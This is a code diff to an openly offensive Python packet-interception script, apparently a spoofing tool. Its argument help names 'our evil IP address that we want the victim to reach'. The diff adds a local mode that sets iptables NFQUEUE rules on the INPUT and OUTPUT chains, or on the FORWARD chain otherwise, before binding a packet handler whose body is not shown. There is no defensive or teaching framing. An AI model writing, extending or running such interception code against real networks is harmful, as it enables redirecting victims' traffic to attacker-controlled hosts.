@@ -23,6 +23,10 @@ def parse_cli_args():
                         metavar="DESTINATION IP ADDRESS",
                         dest="dest",
                         help="Our evil IP address that we want the victim to reach")
+    parser.add_argument("-l", "--local",
+                        nargs=1,
+                        dest="local",
+                        help="Use this option if this script is run locally")
     return parser.parse_args()
 
 
@@ -50,12 +54,17 @@ def process_packet(packet):
 # INPUT chain is used for packets coming in this machine
 # OUTPUT chain is used for packets coming out this machine (after being altered)
 # FORWARD chain is used for packets that go through this machine (in & out - after being altered)
-subprocess.call(
-    # "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
-subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
-subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+if args.local is None:
+    subprocess.call(
+        "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
+else:
+    subprocess.call(
+        "sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
+    subprocess.call(
+        "sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+
 try:
-    queue=NetfilterQueue()
+    queue = NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
 except KeyboardInterrupt:
